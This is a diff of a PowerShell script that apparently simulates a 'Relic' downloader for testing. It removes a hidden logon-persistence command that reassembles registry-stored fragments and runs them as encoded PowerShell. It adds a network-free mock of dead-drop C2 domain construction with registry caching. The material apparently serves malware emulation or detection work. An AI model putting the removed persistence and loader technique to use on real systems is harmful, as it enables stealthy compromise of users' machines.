@@ -1,9 +1,25 @@
-# Obfuscated variable name
-$varName = 'iou mDy0z3cvz5qgm eHM'
+# Benign local simulation of Relic downloader new version (no network)
 
-# Command to read fragments, reassemble, and execute
-$logonCommand = "powershell.exe -WindowStyle Hidden -Command `"`$$varName = (Get-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name '$valueName1').'$valueName1' + (Get-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name '$valueName2').'$valueName2' + (Get-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name '$valueName3').'$valueName3'; powershell.exe -WindowStyle Hidden -EncodedCommand `$$varName`""
+# Mock dead-drop resolver: read from local file or hardcoded
+$deadDropFile = "$env:TEMP\local_dead_drop.txt"
+if (Test-Path $deadDropFile) {
+    $subdomain = Get-Content $deadDropFile -TotalCount 1
+} else {
+    $subdomain = "testsub123"  # Hardcoded fallback
+}
+$c2Domain = "$subdomain.trycloudflare.com"  # Simulated domain construction
 
-# Set in Environment key
-$envPath = 'HKCU:\Environment'
-Set-ItemProperty -Path $envPath -Name 'UserInitMprLogonScript' -Value $logonCommand -Type String
+# Mock resolution: hardcoded fake IP
+$ip = "192.0.2.1"  # Example test IP (RFC 5737)
+
+# Cache the c2Domain in registry
+$regPath = "HKCU:\Cursors"
+$cacheName = "1JBScrdzkt.sm2c1WhmAB0o"
+if (-not (Test-Path $regPath)) {
+    New-Item -Path $regPath -Force
+}
+Set-ItemProperty -Path $regPath -Name $cacheName -Value $c2Domain
+
+# For benign test, log the simulation
+$logPath = "$env:TEMP\benign_relic_test.log"
+Add-Content -Path $logPath -Value "Simulated C2 domain: $c2Domain IP: $ip at $(Get-Date)"
